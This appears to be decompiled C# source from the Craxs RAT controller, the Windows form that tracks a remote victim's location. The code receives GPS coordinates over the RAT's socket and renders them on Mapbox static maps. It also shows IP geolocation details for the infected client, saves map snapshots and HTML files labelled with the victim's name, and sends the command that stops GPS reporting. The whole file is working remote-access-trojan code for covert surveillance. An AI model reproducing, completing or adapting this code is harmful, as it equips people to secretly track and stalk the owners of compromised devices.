#define DEBUG
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Craxs_Rat.My.Resources;
using Craxs_Rat.sockets;
using DrakeUI.Framework;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Craxs_Rat;

[DesignerGenerated]
public class LocationManager : Form
{
	public delegate void Delegate1(DownloadProgressChangedEventArgs e);

	public delegate void Delegate0(Image image);

	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Map")]
	private PictureBox _Map;

	[AccessedThroughProperty("TOpacity")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private System.Windows.Forms.Timer _TOpacity;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("SaveToolStripMenuItem")]
	private ToolStripMenuItem _SaveToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("SaveAsToolStripMenuItem")]
	private ToolStripMenuItem _SaveAsToolStripMenuItem;

	[AccessedThroughProperty("OpenUsingGoogleMapsToolStripMenuItem")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private ToolStripMenuItem _OpenUsingGoogleMapsToolStripMenuItem;

	[AccessedThroughProperty("OpenUsingMapBoxToolStripMenuItem")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ToolStripMenuItem _OpenUsingMapBoxToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUICheckBox1")]
	private DrakeUICheckBox _DrakeUICheckBox1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("savetimer")]
	private System.Windows.Forms.Timer _savetimer;

	public string[] infoMaps;

	public TcpClient Client;

	public Client classClient;

	public string Link;

	public string Key;

	public double Latitude;

	public double Longitude;

	public Size ImageSize;

	public int Zoom;

	public string Markers;

	public List<Array> List;

	[AccessedThroughProperty("waiter1")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private WebClient _waiter1;

	public Thread Threadingg;

	public string style;

	public string Title;

	public string Accuracy;

	public string Speed;

	private bool MouseState;

	public bool Issilent;

	public string tmpFolderUSER;

	private bool boSave;

	internal virtual PictureBox Map
	{
		[CompilerGenerated]
		get
		{
			return _Map;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			MouseEventHandler value2 = Map_MouseWheel;
			MouseEventHandler value3 = Map_MouseDoubleClick;
			EventHandler value4 = Map_MouseHover;
			EventHandler value5 = Map_MouseLeave;
			PaintEventHandler value6 = Map_Paint;
			PictureBox pictureBox = _Map;
			if (pictureBox != null)
			{
				pictureBox.MouseWheel -= value2;
				pictureBox.MouseDoubleClick -= value3;
				pictureBox.MouseHover -= value4;
				pictureBox.MouseLeave -= value5;
				pictureBox.Paint -= value6;
			}
			_Map = value;
			pictureBox = _Map;
			if (pictureBox != null)
			{
				pictureBox.MouseWheel += value2;
				pictureBox.MouseDoubleClick += value3;
				pictureBox.MouseHover += value4;
				pictureBox.MouseLeave += value5;
				pictureBox.Paint += value6;
			}
		}
	}

	[field: AccessedThroughProperty("ProgressBar1")]
	internal virtual ProgressBar ProgressBar1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual System.Windows.Forms.Timer TOpacity
	{
		[CompilerGenerated]
		get
		{
			return _TOpacity;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = TOpacity_Tick;
			System.Windows.Forms.Timer timer = _TOpacity;
			if (timer != null)
			{
				timer.Tick -= value2;
			}
			_TOpacity = value;
			timer = _TOpacity;
			if (timer != null)
			{
				timer.Tick += value2;
			}
		}
	}

	[field: AccessedThroughProperty("ctxMenu")]
	internal virtual ContextMenuStrip ctxMenu
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem SaveToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _SaveToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = SaveToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _SaveToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_SaveToolStripMenuItem = value;
			toolStripMenuItem = _SaveToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem SaveAsToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _SaveAsToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = SaveAsToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _SaveAsToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_SaveAsToolStripMenuItem = value;
			toolStripMenuItem = _SaveAsToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem OpenUsingGoogleMapsToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _OpenUsingGoogleMapsToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = OpenUsingGoogleMapsToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _OpenUsingGoogleMapsToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_OpenUsingGoogleMapsToolStripMenuItem = value;
			toolStripMenuItem = _OpenUsingGoogleMapsToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem OpenUsingMapBoxToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _OpenUsingMapBoxToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = OpenUsingMapBoxToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _OpenUsingMapBoxToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_OpenUsingMapBoxToolStripMenuItem = value;
			toolStripMenuItem = _OpenUsingMapBoxToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel1")]
	internal virtual Panel Panel1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TextBox1")]
	internal virtual TextBox TextBox1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel2")]
	internal virtual Panel Panel2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUICheckBox DrakeUICheckBox1
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUICheckBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			DrakeUICheckBox.OnValueChanged value2 = DrakeUICheckBox1_ValueChanged;
			DrakeUICheckBox drakeUICheckBox = _DrakeUICheckBox1;
			if (drakeUICheckBox != null)
			{
				drakeUICheckBox.ValueChanged -= value2;
			}
			_DrakeUICheckBox1 = value;
			drakeUICheckBox = _DrakeUICheckBox1;
			if (drakeUICheckBox != null)
			{
				drakeUICheckBox.ValueChanged += value2;
			}
		}
	}

	internal virtual System.Windows.Forms.Timer savetimer
	{
		[CompilerGenerated]
		get
		{
			return _savetimer;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Savetimer_Tick;
			System.Windows.Forms.Timer timer = _savetimer;
			if (timer != null)
			{
				timer.Tick -= value2;
			}
			_savetimer = value;
			timer = _savetimer;
			if (timer != null)
			{
				timer.Tick += value2;
			}
		}
	}

	public virtual WebClient waiter1
	{
		[CompilerGenerated]
		get
		{
			return _waiter1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			DownloadProgressChangedEventHandler value2 = waiter1_DownloadProgressChanged;
			WebClient webClient = _waiter1;
			if (webClient != null)
			{
				webClient.DownloadProgressChanged -= value2;
			}
			_waiter1 = value;
			webClient = _waiter1;
			if (webClient != null)
			{
				webClient.DownloadProgressChanged += value2;
			}
		}
	}

	public LocationManager()
	{
		base.Load += LocationManager_Load;
		base.KeyDown += Map_KeyDown;
		base.Closing += LocationManager_Closing;
		List = new List<Array>();
		waiter1 = new WebClient();
		Title = "null";
		MouseState = false;
		Issilent = false;
		tmpFolderUSER = "";
		boSave = false;
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		this.Map = new System.Windows.Forms.PictureBox();
		this.ProgressBar1 = new System.Windows.Forms.ProgressBar();
		this.TOpacity = new System.Windows.Forms.Timer(this.components);
		this.ctxMenu = new System.Windows.Forms.ContextMenuStrip(this.components);
		this.SaveToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.SaveAsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.OpenUsingGoogleMapsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.OpenUsingMapBoxToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.Panel1 = new System.Windows.Forms.Panel();
		this.TextBox1 = new System.Windows.Forms.TextBox();
		this.Panel2 = new System.Windows.Forms.Panel();
		this.DrakeUICheckBox1 = new DrakeUI.Framework.DrakeUICheckBox();
		this.savetimer = new System.Windows.Forms.Timer(this.components);
		((System.ComponentModel.ISupportInitialize)this.Map).BeginInit();
		this.ctxMenu.SuspendLayout();
		this.Panel1.SuspendLayout();
		this.Panel2.SuspendLayout();
		base.SuspendLayout();
		this.Map.BackColor = System.Drawing.Color.Black;
		this.Map.Dock = System.Windows.Forms.DockStyle.Fill;
		this.Map.Location = new System.Drawing.Point(0, 0);
		this.Map.Name = "Map";
		this.Map.Size = new System.Drawing.Size(434, 354);
		this.Map.TabIndex = 0;
		this.Map.TabStop = false;
		this.ProgressBar1.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.ProgressBar1.Location = new System.Drawing.Point(0, 354);
		this.ProgressBar1.Name = "ProgressBar1";
		this.ProgressBar1.Size = new System.Drawing.Size(574, 10);
		this.ProgressBar1.TabIndex = 1;
		this.TOpacity.Interval = 1;
		this.ctxMenu.Items.AddRange(new System.Windows.Forms.ToolStripItem[4] { this.SaveToolStripMenuItem, this.SaveAsToolStripMenuItem, this.OpenUsingGoogleMapsToolStripMenuItem, this.OpenUsingMapBoxToolStripMenuItem });
		this.ctxMenu.Name = "ctxMenu";
		this.ctxMenu.ShowImageMargin = false;
		this.ctxMenu.Size = new System.Drawing.Size(184, 92);
		this.SaveToolStripMenuItem.Name = "SaveToolStripMenuItem";
		this.SaveToolStripMenuItem.Size = new System.Drawing.Size(183, 22);
		this.SaveToolStripMenuItem.Text = "Save";
		this.SaveToolStripMenuItem.Visible = false;
		this.SaveAsToolStripMenuItem.Name = "SaveAsToolStripMenuItem";
		this.SaveAsToolStripMenuItem.Size = new System.Drawing.Size(183, 22);
		this.SaveAsToolStripMenuItem.Text = "Save As";
		this.SaveAsToolStripMenuItem.Visible = false;
		this.OpenUsingGoogleMapsToolStripMenuItem.Name = "OpenUsingGoogleMapsToolStripMenuItem";
		this.OpenUsingGoogleMapsToolStripMenuItem.Size = new System.Drawing.Size(183, 22);
		this.OpenUsingGoogleMapsToolStripMenuItem.Text = "Open using Google Maps";
		this.OpenUsingMapBoxToolStripMenuItem.Name = "OpenUsingMapBoxToolStripMenuItem";
		this.OpenUsingMapBoxToolStripMenuItem.Size = new System.Drawing.Size(183, 22);
		this.OpenUsingMapBoxToolStripMenuItem.Text = "Open using Mapbox";
		this.Panel1.BackColor = System.Drawing.Color.FromArgb(10, 10, 10);
		this.Panel1.Controls.Add(this.TextBox1);
		this.Panel1.Controls.Add(this.Panel2);
		this.Panel1.Dock = System.Windows.Forms.DockStyle.Right;
		this.Panel1.Location = new System.Drawing.Point(434, 0);
		this.Panel1.Name = "Panel1";
		this.Panel1.Size = new System.Drawing.Size(140, 354);
		this.Panel1.TabIndex = 2;
		this.TextBox1.BackColor = System.Drawing.Color.FromArgb(5, 5, 5);
		this.TextBox1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.TextBox1.Font = new System.Drawing.Font("Calibri", 9f, System.Drawing.FontStyle.Bold);
		this.TextBox1.ForeColor = System.Drawing.Color.SkyBlue;
		this.TextBox1.Location = new System.Drawing.Point(0, 0);
		this.TextBox1.Multiline = true;
		this.TextBox1.Name = "TextBox1";
		this.TextBox1.ReadOnly = true;
		this.TextBox1.Size = new System.Drawing.Size(140, 314);
		this.TextBox1.TabIndex = 0;
		this.Panel2.Controls.Add(this.DrakeUICheckBox1);
		this.Panel2.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.Panel2.Location = new System.Drawing.Point(0, 314);
		this.Panel2.Name = "Panel2";
		this.Panel2.Size = new System.Drawing.Size(140, 40);
		this.Panel2.TabIndex = 3;
		this.DrakeUICheckBox1.CheckBoxColor = System.Drawing.Color.SkyBlue;
		this.DrakeUICheckBox1.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUICheckBox1.Font = new System.Drawing.Font("Calibri", 12f);
		this.DrakeUICheckBox1.ForeColor = System.Drawing.Color.SkyBlue;
		this.DrakeUICheckBox1.Location = new System.Drawing.Point(39, 6);
		this.DrakeUICheckBox1.Name = "DrakeUICheckBox1";
		this.DrakeUICheckBox1.Padding = new System.Windows.Forms.Padding(22, 0, 0, 0);
		this.DrakeUICheckBox1.Size = new System.Drawing.Size(69, 29);
		this.DrakeUICheckBox1.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUICheckBox1.TabIndex = 0;
		this.DrakeUICheckBox1.Text = "Save";
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(574, 364);
		base.Controls.Add(this.Map);
		base.Controls.Add(this.Panel1);
		base.Controls.Add(this.ProgressBar1);
		base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle;
		base.MaximizeBox = false;
		this.MaximumSize = new System.Drawing.Size(590, 403);
		base.Name = "LocationManager";
		base.Opacity = 0.0;
		base.ShowIcon = false;
		this.Text = "LocationManager";
		((System.ComponentModel.ISupportInitialize)this.Map).EndInit();
		this.ctxMenu.ResumeLayout(false);
		this.Panel1.ResumeLayout(false);
		this.Panel1.PerformLayout();
		this.Panel2.ResumeLayout(false);
		base.ResumeLayout(false);
	}

	private void TOpacity_Tick(object sender, EventArgs e)
	{
		if (base.Opacity != 1.0)
		{
			base.Opacity += 0.1;
		}
		else
		{
			TOpacity.Enabled = false;
		}
	}

	private void LocationManager_Load(object sender, EventArgs e)
	{
		SaveToolStripMenuItem.Visible = true;
		SaveAsToolStripMenuItem.Visible = true;
		Map.ContextMenuStrip = ctxMenu;
		base.Icon = new Icon(reso.res_Path + "\\Icons\\win\\10.ico");
		string text = Data.cityclass.Getinfo(classClient.ClientAddressIP);
		string[] array = text.Split('#');
		TextBox1.AppendText("Client Address info\r\n\r\n\r\n\r\n");
		string[] array2 = array;
		foreach (string text2 in array2)
		{
			TextBox1.AppendText(text2 + "\r\n---\r\n");
		}
		Threadingg = new Thread(Threadings);
		Threadingg.Priority = ThreadPriority.Normal;
		Threadingg.IsBackground = true;
		Threadingg.Start();
		Text = Title;
		TOpacity.Interval = SpySettings.T_Interval;
		TOpacity.Enabled = true;
	}

	private void DownloadDataCallback(object sender, DownloadDataCompletedEventArgs e)
	{
		MemoryStream memoryStream = new MemoryStream();
		AutoResetEvent autoResetEvent = (AutoResetEvent)e.UserState;
		checked
		{
			try
			{
				if (!e.Cancelled && e.Error == null)
				{
					byte[] result = e.Result;
					memoryStream.Write(result, 0, result.Length);
					classClient.MyServer.BytesReceived += memoryStream.Length;
				}
			}
			finally
			{
				if (memoryStream.Length > 0L)
				{
					Image image = Image.FromStream(memoryStream);
					MapView(image);
				}
				autoResetEvent.Set();
			}
		}
	}

	private void waiter1_DownloadProgressChanged(object sender, DownloadProgressChangedEventArgs e)
	{
		Progress(e);
	}

	private void Progress(DownloadProgressChangedEventArgs e)
	{
		try
		{
			if (base.InvokeRequired)
			{
				Invoke(new Delegate1(Progress), e);
				return;
			}
			ProgressBar1.Value = e.ProgressPercentage;
			if (ProgressBar1.Value == ProgressBar1.Maximum)
			{
				ProgressBar1.Value = 0;
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void MapView(Image image)
	{
		try
		{
			if (base.InvokeRequired)
			{
				Invoke(new Delegate0(MapView), image);
			}
			else
			{
				Map.Image = image;
				Map.Invalidate();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void Threadings()
	{
		while (true)
		{
			Thread.Sleep(10);
			if (List.Count <= 0)
			{
				continue;
			}
			try
			{
				Latitude = (double)List[0].GetValue(0);
				Longitude = (double)List[0].GetValue(1);
				AutoResetEvent autoResetEvent = new AutoResetEvent(initialState: false);
				if (waiter1 != null)
				{
					waiter1.DownloadDataCompleted -= DownloadDataCallback;
				}
				waiter1.DownloadDataCompleted += DownloadDataCallback;
				Debug.WriteLine(FormatLink());
				waiter1.DownloadDataAsync(new Uri(FormatLink()), autoResetEvent);
				autoResetEvent.WaitOne();
				waiter1.Dispose();
				List.RemoveAt(0);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				Debug.WriteLine("Error Threading location");
				ProjectData.ClearProjectError();
			}
		}
	}

	private string FormatLink()
	{
		string markers = Markers;
		markers = markers.Replace("<Longitude>", Conversions.ToString(Longitude)).Replace("<Latitude>", Conversions.ToString(Latitude));
		return string.Format("{0}{1}/static/{2}{3}?access_token={4}", Link, style, markers, Conversions.ToString(Longitude) + "," + Conversions.ToString(Latitude) + ")/" + Conversions.ToString(Longitude) + "," + Conversions.ToString(Latitude) + "," + Conversions.ToString(Zoom) + "/" + Conversions.ToString(ImageSize.Width) + "x" + Conversions.ToString(ImageSize.Height), Key);
	}

	private void NextZoom()
	{
		checked
		{
			Zoom++;
			if (Zoom >= 21)
			{
				Zoom = 21;
			}
			List.Add(new double[2] { Latitude, Longitude });
		}
	}

	private void BackZoom()
	{
		checked
		{
			Zoom--;
			if (Zoom <= 1)
			{
				Zoom = 1;
			}
			List.Add(new double[2] { Latitude, Longitude });
		}
	}

	private void Map_MouseWheel(object sender, MouseEventArgs e)
	{
		if (e.Delta < 0)
		{
			BackZoom();
		}
		else if (e.Delta > 0)
		{
			NextZoom();
		}
	}

	private void Map_KeyDown(object sender, KeyEventArgs e)
	{
		if (e.KeyData == Keys.Up)
		{
			NextZoom();
		}
		else if (e.KeyData == Keys.Down)
		{
			BackZoom();
		}
	}

	private void LocationManager_Closing(object sender, CancelEventArgs e)
	{
		if (!Issilent && classClient != null)
		{
			object[] parametersObjects = new object[4]
			{
				Client,
				SecurityKey.KeysClient4 + Data.SPL_SOCKET,
				Codes.Encoding().GetBytes("null"),
				classClient
			};
			classClient.qitGPS = true;
			classClient.SendMessage(parametersObjects);
		}
		try
		{
			Threadingg.Abort();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void Map_MouseDoubleClick(object sender, MouseEventArgs e)
	{
		MapBOX();
	}

	private void MapBOX()
	{
		try
		{
			if (infoMaps.Length > 0 && Directory.Exists(infoMaps[0]))
			{
				string text = infoMaps[0] + "\\Location Manager";
				if (!Directory.Exists(text))
				{
					Directory.CreateDirectory(text);
				}
				string map = Resources.map;
				map = map.Replace("\\\\accessToken:\\\\", Key).Replace("\\\\style:\\\\", "mapbox://styles/" + style).Replace("\\\\:\\\\,\\\\:\\\\", Conversions.ToString(Longitude) + "," + Conversions.ToString(Latitude))
					.Replace("\\\\name_victim:\\\\", infoMaps[1]);
				string text2 = text + "\\" + DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") + ".html";
				File.WriteAllText(text2, map);
				Process.Start(text2);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void Map_MouseHover(object sender, EventArgs e)
	{
		MouseState = true;
		Map.Invalidate();
	}

	private void Map_MouseLeave(object sender, EventArgs e)
	{
		MouseState = false;
		Map.Invalidate();
	}

	private void Map_Paint(object sender, PaintEventArgs e)
	{
		if (MouseState & (Operators.CompareString(Accuracy, "jump", TextCompare: false) != 0) & (Operators.CompareString(Speed, "jump", TextCompare: false) != 0))
		{
			string s = $"Accuracy {Accuracy} - {Speed}";
			SizeF sizeF = default(SizeF);
			sizeF = e.Graphics.MeasureString(s, reso.f);
			Rectangle rect = checked(new Rectangle(5, 5, (int)Math.Round(sizeF.Width), (int)Math.Round(sizeF.Height)));
			Color defaultColor_Background = SpySettings.DefaultColor_Background;
			e.Graphics.FillRectangle(new Pen(Color.FromArgb(200, defaultColor_Background.R, defaultColor_Background.G, defaultColor_Background.B)).Brush, rect);
			e.Graphics.DrawString(s, reso.f, new SolidBrush(SpySettings.DefaultColor_Foreground), 5f, 5f);
		}
	}

	private void OpenUsingGoogleMapsToolStripMenuItem_Click(object sender, EventArgs e)
	{
		string fileName = string.Format("https://www.google.com/maps/dir/{0},{1}/@{2},{3},{4}", Conversions.ToString(Latitude), Conversions.ToString(Longitude), Conversions.ToString(Latitude), Conversions.ToString(Longitude), "17z");
		Process.Start(fileName);
	}

	private void OpenUsingMapBoxToolStripMenuItem_Click(object sender, EventArgs e)
	{
		MapBOX();
	}

	private void Savetimer_Tick(object sender, EventArgs e)
	{
		string text = tmpFolderUSER + "\\Location Manager";
		if (boSave)
		{
			if (!Directory.Exists(text))
			{
				Directory.CreateDirectory(text);
			}
			if (Directory.Exists(text))
			{
				Map.Image.Save(text + "\\p_" + DateAndTime.Now.ToString("yyMMddhhmmssfff") + ".jpg", ImageFormat.Jpeg);
			}
		}
		else
		{
			savetimer.Stop();
			savetimer.Dispose();
		}
	}

	private void DrakeUICheckBox1_ValueChanged(object sender, bool value)
	{
		if (Map.Image == null)
		{
			return;
		}
		if (DrakeUICheckBox1.Checked)
		{
			savetimer.Start();
			boSave = true;
			string text = tmpFolderUSER + "\\Location Manager";
			if (!Directory.Exists(text))
			{
				Directory.CreateDirectory(text);
			}
			Process.Start(text);
		}
		else
		{
			savetimer.Stop();
			boSave = false;
		}
	}

	private void SaveToolStripMenuItem_Click(object sender, EventArgs e)
	{
		try
		{
			if (infoMaps.Length > 0 && Directory.Exists(infoMaps[0]))
			{
				string text = infoMaps[0] + "\\Location Manager";
				if (!Directory.Exists(text))
				{
					Directory.CreateDirectory(text);
				}
				string map = Resources.map;
				map = map.Replace("\\\\accessToken:\\\\", Key).Replace("\\\\style:\\\\", "mapbox://styles/" + style).Replace("\\\\:\\\\,\\\\:\\\\", Conversions.ToString(Longitude) + "," + Conversions.ToString(Latitude))
					.Replace("\\\\name_victim:\\\\", infoMaps[1]);
				File.WriteAllText(text + "\\" + DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") + ".html", map);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void SaveAsToolStripMenuItem_Click(object sender, EventArgs e)
	{
		try
		{
			if (infoMaps.Length > 0)
			{
				_ = infoMaps[0] + "\\Location Manager";
				string map = Resources.map;
				map = map.Replace("\\\\accessToken:\\\\", Key).Replace("\\\\style:\\\\", "mapbox://styles/" + style).Replace("\\\\:\\\\,\\\\:\\\\", Conversions.ToString(Longitude) + "," + Conversions.ToString(Latitude))
					.Replace("\\\\name_victim:\\\\", infoMaps[1]);
				SaveFileDialog saveFileDialog = new SaveFileDialog();
				saveFileDialog.FileName = DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") + ".html";
				saveFileDialog.Filter = "html (*.html)|*.html";
				if (saveFileDialog.ShowDialog() == DialogResult.OK)
				{
					File.WriteAllText(saveFileDialog.FileName, map);
				}
				saveFileDialog.Dispose();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
